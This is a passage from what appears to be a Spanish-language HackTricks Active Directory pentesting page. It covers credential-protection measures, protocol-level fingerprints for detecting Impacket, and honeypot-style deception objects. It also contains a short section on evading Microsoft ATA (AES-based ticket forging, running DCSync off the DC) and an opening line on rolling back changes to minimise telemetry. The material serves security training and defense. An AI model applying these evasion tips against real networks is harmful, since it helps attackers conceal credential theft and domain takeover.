- Los comandos de eliminación con alcance preciso (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten revertir rápidamente los cambios después de que el operador recopile credenciales o establezca persistencia, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Obtén más información sobre cómo proteger las credenciales aquí.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Restricciones para Domain Admins**: Se recomienda que Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Privilegios de cuentas de servicio**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Se debe limitar la duración de las tareas que requieren privilegios de DA. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de LDAP relay**: Audita los Event ID 2889/3074/3075 y luego aplica LDAP signing y el channel binding de LDAPS en DC/clients para bloquear intentos de MITM/relay de LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a nivel de protocolo de la actividad de Impacket

Si quieres detectar tradecraft habitual de AD, **no dependas únicamente de artefactos controlados por el operador**, como binarios renombrados, nombres de servicio, archivos batch temporales o rutas de salida. Establece una línea base de cómo los clientes Windows legítimos generan tráfico de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC y WMI; luego busca **peculiaridades de implementación** que persisten incluso después de que el operador modifica `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Posibles indicadores independientes de alta confianza** (tras validarlos con tu propia línea base):
  - DCE/RPC autenticado que usa `auth_context_id = 79231 + ctx_id`
  - Padding de autenticación DCE/RPC rellenado con `0xff`
  - Enlaces LDAP con Kerberos que colocan un `AP-REQ` de Kerberos sin procesar directamente en `mechToken` de SPNEGO
  - Solicitudes de negociación SMB2/3 con valores de `ClientGuid` que parecen ASCII
  - `IWbemLevel1Login::NTLMLogin` de WMI que usa el namespace no estándar `//./root/cimv2`
  - Valores de nonce de Kerberos codificados de forma fija
- **Mejor como características de correlación/puntuación**:
  - Listas de etype de Kerberos escasas o duplicadas, `PA-DATA` inusual o ausente, o un orden de etype de TGS-REQ distinto al de Windows nativo
  - Mensajes NTLM Type 1 sin información de versión o mensajes Type 3 con nombres de host nulos
  - NTLMSSP sin procesar transportado en DCE/RPC en lugar de SPNEGO, ausencia de tráileres de verificación DCE/RPC o discrepancias entre los OID de SPNEGO/Kerberos
  - Varios de estos rasgos del mismo host/usuario/sesión/período de tiempo son mucho más significativos que cualquier campo débil por sí solo
- **Úsalos como enriquecimiento, no como alertas independientes**:
  - Nombres de archivo predeterminados, rutas de salida, nombres de servicio aleatorios, nombres de batch temporales, nombres de cuenta de equipo predeterminados y cadenas HTTP/WebDAV/RDP/MSSQL específicas de herramientas
  - Son fáciles de cambiar para los operadores y es mejor usarlos para explicar por qué un conjunto de señales de varios protocolos resulta sospechoso
- **Notas operativas**:
  - Algunas de estas señales requieren tráfico descifrado, [análisis de PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilidad del lado del servicio
  - Valida las señales con clientes Samba/Linux, dispositivos y software heredado antes de convertirlas en alertas
  - A medida que aumente la confianza en la línea base, promueve las detecciones de enriquecimiento -> búsqueda -> alertas

### **Implementación de técnicas de deception**

- Implementar deception implica colocar trampas, como usuarios o equipos señuelo con características como contraseñas que no caducan o marcados como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o agregarlos a grupos con privilegios elevados.<sup>[[2]](#references)</sup>
- Un ejemplo práctico consiste en usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Puedes encontrar más información sobre cómo implementar técnicas de deception en [Deploy-Deception en GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificación de deception**

- **Para objetos de usuario**: Entre los indicadores sospechosos se incluyen ObjectSID atípicos, inicios de sesión poco frecuentes, fechas de creación y pocos recuentos de contraseñas incorrectas.
- **Indicadores generales**: Comparar los atributos de posibles objetos señuelo con los de objetos auténticos puede revelar incoherencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar este tipo de deception.

### **Evasión de sistemas de detección**

- **Evasión de la detección de Microsoft ATA**:
  - **Enumeración de usuarios**: Evitar la enumeración de sesiones en Domain Controllers para impedir la detección de ATA.
  - **Suplantación de tickets**: Usar claves **aes** para crear tickets ayuda a evadir la detección al no degradar a NTLM.
  - **Ataques DCSync**: Se recomienda ejecutarlos desde un equipo que no sea Domain Controller para evitar la detección de ATA, ya que la ejecución directa desde un Domain Controller activará alertas.

## References

- [1] [Guía para atacar confianzas de dominio](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjar confianzas para deception en Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Colección LDAP BOF: kit de herramientas LDAP en memoria para la explotación de Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – ¡Holy Shuck! Usar hashes NTLM como wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (laboratorio AD de NetExec) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Análisis de Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: toma de control de cuentas de Active Directory mediante Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Cómo gestionar los cambios en las conexiones del canal seguro de Netlogon asociados con CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un recorrido por las interfaces olvidadas de Null Session y MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [¿Es SID filter una frontera de seguridad entre dominios? (Parte 4) - Investigación sobre la evasión del filtrado SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [¿Es SID filter una frontera de seguridad entre dominios? (Parte 5) - Ataque de confianza Golden GMSA: del dominio hijo al padre](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [¿Es SID filter una frontera de seguridad entre dominios? (Parte 6) - Ataque de confianza mediante cambio de esquema: del dominio hijo al padre](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA a EA con ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalar de administradores de un dominio hijo a Enterprise Admins en 5 minutos abusando de AD CS: continuación](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Una ACE bajo la manga: diseño de puertas traseras DACL de Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Código fuente del módulo pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atributo msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
